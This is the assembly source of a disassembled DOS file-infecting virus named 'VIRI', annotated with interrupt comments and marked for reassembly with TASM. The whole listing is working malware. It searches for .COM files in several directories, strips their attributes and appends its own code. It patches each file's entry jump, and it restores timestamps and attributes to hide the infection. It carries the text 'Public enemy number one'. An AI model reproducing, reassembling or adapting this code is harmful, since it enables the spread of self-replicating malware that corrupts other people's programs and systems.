PAGE  59,132
  
;��������������������������������������������������������������������������
;��                                      ��
;��                 VIRI                         ��
;��                                      ��
;��      Created:   7-Jan-92                             ��
;��                                      ��
;�� Disassembled by -=>Wasp<=- aka >>Night Crawler<<                     ��
;�� Reassemble with TASM 2.0                                             ��
;��������������������������������������������������������������������������
  
DATA_1E     EQU 0
DATA_2E     EQU 0DH
DATA_3E     EQU 19H
DATA_4E     EQU 1CH
DATA_5E     EQU 3AH
DATA_6E     EQU 47H
  
SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A
  
  
        ORG 100h
  
VIRI        PROC    FAR
  
START:
        JMP SHORT LOC_2     ; (0151)
        DB   90H, 2AH, 2EH, 43H, 4FH, 4DH
        DB   00H, 5CH, 2AH, 2EH, 43H, 4FH
        DB   4DH, 00H
        DB  '\DOS\*.COM'
        DB   00H, 00H,0CDH, 20H
        DB  44 DUP (0)
        DB  0E9H, 00H, 00H,0B4H, 85H, 00H
        DB   00H
LOC_2:
        MOV DX,103H
        CLD             ; Clear direction
        MOV SI,DX
        ADD SI,19H
        MOV DI,OFFSET DS:[100H]
        MOV CX,3
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV SI,DX
        MOV AX,3524H
        INT 21H         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        PUSH    ES
        PUSH    BX
        MOV AX,2524H
;*      MOV DX,OFFSET LOC_1     ;*
        DB  0BAH,0B6H, 00H
        ADD DX,SI
        INT 21H         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        PUSH    DS
        POP ES
        PUSH    ES
        MOV AH,2FH          ; '/'
        INT 21H         ; DOS Services  ah=function 2Fh
                        ;  get DTA ptr into es:bx
        MOV [SI+4AH],ES
        MOV [SI+4CH],BX
        POP ES
        MOV AH,1AH
        MOV DX,DATA_4E
        ADD DX,SI
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        CMP BYTE PTR [SI+18H],10H
        JA  LOC_3           ; Jump if above
        MOV DX,0
        ADD DX,SI
        JMP SHORT LOC_5     ; (01AF)
        DB  90H
LOC_3:
        CMP BYTE PTR [SI+18H],20H   ; ' '
        JA  LOC_4           ; Jump if above
        MOV DX,6
        ADD DX,SI
        JMP SHORT LOC_5     ; (01AF)
        DB  90H
LOC_4:
        MOV DX,DATA_2E
        ADD DX,SI
LOC_5:
        MOV CX,23H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_8     ; (01DE)
        DB  90H
  
VIRI        ENDP
  
;��������������������������������������������������������������������������
;
;           External Entry Point
;
;��������������������������������������������������������������������������
  
INT_24H_ENTRY   PROC    FAR
        MOV AL,0
        IRET                ; Interrupt return
INT_24H_ENTRY   ENDP
  
LOC_6:
        MOV AX,[SI+4AH]
        MOV DS,AX
        MOV DX,[SI+4CH]
        MOV AH,1AH
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AX,2524H
        POP DX
        POP DS
        INT 21H         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        PUSH    ES
        POP DS
        MOV DI,OFFSET START
        PUSH    DI
        RETN    0FFFFH
LOC_7:
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
LOC_8:
        MOV AX,[SI+36H]
        CMP AX,400H
        JB  LOC_7           ; Jump if below
        CMP AX,0F230H
        JA  LOC_7           ; Jump if above
        MOV AX,4301H
        MOV DX,DATA_5E
        ADD DX,SI
        MOV CX,0
        INT 21H         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        MOV DX,DATA_5E
        ADD DX,SI
        MOV AX,3D02H
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        JC  LOC_10          ; Jump if carry Set
        XCHG    AX,BX
        MOV DX,DATA_3E
        ADD DX,SI
        MOV CX,3
        MOV AH,3FH          ; '?'
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        JC  LOC_10          ; Jump if carry Set
        MOV CL,[SI+1AH]
        MOV CH,[SI+1BH]
        MOV AX,[SI+36H]
        SUB AX,1ADH
        ADD AX,4BH
        CMP AX,CX
        JE  LOC_10          ; Jump if equal
        MOV AX,4202H
        XOR CX,CX           ; Zero register
        XOR DX,DX           ; Zero register
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_10          ; Jump if carry Set
        MOV DI,SI
        ADD DI,4FH
        ADD AX,100H
        MOV [DI],AX
        SUB AX,103H
        MOV [SI+48H],AX
        ADD WORD PTR [SI+48H],4EH
        INC BYTE PTR [SI+18H]
        CMP BYTE PTR [SI+18H],30H   ; '0'
        JB  LOC_9           ; Jump if below
        MOV BYTE PTR [SI+18H],0
LOC_9:
        MOV AH,40H          ; '@'
        MOV DX,DATA_1E
        ADD DX,SI
        MOV CX,1ADH
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        JC  LOC_10          ; Jump if carry Set
        MOV AX,4200H
        XOR CX,CX           ; Zero register
        XOR DX,DX           ; Zero register
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_10          ; Jump if carry Set
        MOV AH,40H          ; '@'
        MOV CX,3
        MOV DX,DATA_6E
        ADD DX,SI
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_10:
        MOV CX,[SI+32H]
        MOV DX,[SI+34H]
        MOV AX,5701H
        INT 21H         ; DOS Services  ah=function 57h
                        ;  get/set file date & time
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        MOV AX,4301H
        MOV CX,[SI+31H]
        XOR CH,CH           ; Zero register
        MOV DX,DATA_5E
        ADD DX,SI
        INT 21H         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        JMP LOC_7           ; (01D8)
        DB  'Public enemy number one'
  
SEG_A       ENDS
  
  
  
        END START
        